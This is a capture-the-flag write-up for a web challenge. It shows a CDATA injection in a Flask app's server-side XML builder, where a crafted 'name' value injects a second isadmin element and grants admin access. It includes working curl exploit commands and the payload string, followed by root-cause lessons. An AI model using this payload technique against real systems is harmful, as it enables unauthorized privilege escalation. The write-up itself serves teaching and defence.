# XML-kontroll 2 — English

**Category:** Web. **Points:** 1000.
**Target:** `http://xmlkontroll2.challs.crate.nu` (Flask/gunicorn).
**Flag format:** `cratectf{...}` (literal value redacted — you recover it yourself).

A CDATA-injection in a server-side XML builder lets you inject a second
`<isadmin>true</isadmin>` element, which flips the account to admin and reveals an
admin-only news item that contains the flag.

## 1. Recon

The app has two routes: `/` (news feed) and `/settings` (a form with fields `name` and
`country`). The settings form posts as multipart:

```html
<form action="/settings?debug=0" method="post" enctype="multipart/form-data">
```

The `debug` query parameter is the key lead. POST to `/settings?debug=1` and the server
echoes the **XML it constructs and parses** server-side:

```bash
curl -s -X POST "http://xmlkontroll2.challs.crate.nu/settings?debug=1" \
  -F "name=testuser" -F "country=se"
```

The debug output ("XML parser input") contains:

```xml
<?xml version="1.0"?>
<user>
  <isadmin>false</isadmin>
  <name><![CDATA[testuser]]></name>
  <country><![CDATA[se]]></country>
</user>
```

Both `name` and `country` are interpolated **unescaped** into `CDATA` blocks. The
account defaults to `<isadmin>false</isadmin>`.

## 2. The vulnerability — CDATA injection

Nothing neutralises the CDATA terminator `]]>` in user input. A `name` value containing
`]]>` closes the CDATA section early, after which attacker text is parsed as **real
XML**. We inject a second `<isadmin>true</isadmin>` sibling and then reopen a CDATA
section so the template's trailing `]]></name>` stays well-formed.

A naive payload (`]]><isadmin>true</isadmin><name><![CDATA[x`) opens a nested `<name>`
without closing the original one, leaving the template's trailing `</name>` unmatched →
HTTP 500. The **balanced** payload closes `</name>` first:

```
name    = ]]></name><isadmin>true</isadmin><name><![CDATA[
country  = se
```

Substituted into the template, this produces well-formed XML with **two** `<isadmin>`
elements:

```xml
<user>
  <isadmin>false</isadmin>
  <name><![CDATA[]]></name><isadmin>true</isadmin><name><![CDATA[]]></name>
  <country><![CDATA[se]]></country>
</user>
```

The backend's XML→object step takes the **last** `<isadmin>` value it sees, so the
request is treated as admin.

## 3. Exploit

```bash
curl -s -X POST "http://xmlkontroll2.challs.crate.nu/settings?debug=1" \
  -F "name=]]></name><isadmin>true</isadmin><name><![CDATA[" \
  -F "country=se" \
  | grep -o "cratectf{[^}]*}"
```

(`debug=1` is convenient for confirming the injected XML, but the privilege elevation
itself works regardless of the debug flag — the flag appears in the rendered admin-only
content.)

### What the response shows

With `isadmin` now `true`, the response's news feed gains an extra, highlighted (grey)
**admin-only** item — a "leaked CEO/VD password" story (Swedish: *"Stulen kunddata från
dataintrång nu till salu på dark web"*). Its body contains the flag in cleartext in
`cratectf{...}` format. The `grep` above extracts it directly.

## Verification

Platform-confirmed solved. The balanced CDATA-injection payload in the `name` field
injects a second `<isadmin>true</isadmin>`, the parser honours the last value, and the
admin-only news item then renders the flag in `cratectf{...}` format.

## Root cause / lesson

- Never interpolate user input into XML (even inside `CDATA`) without escaping `]]>`.
- "Last element wins" deserialization is dangerous when duplicate elements can be
  injected — validate against a strict single-occurrence schema before trusting auth
  flags like `isadmin`.
- Debug/diagnostic endpoints that echo internal structures should never be reachable in
  production.
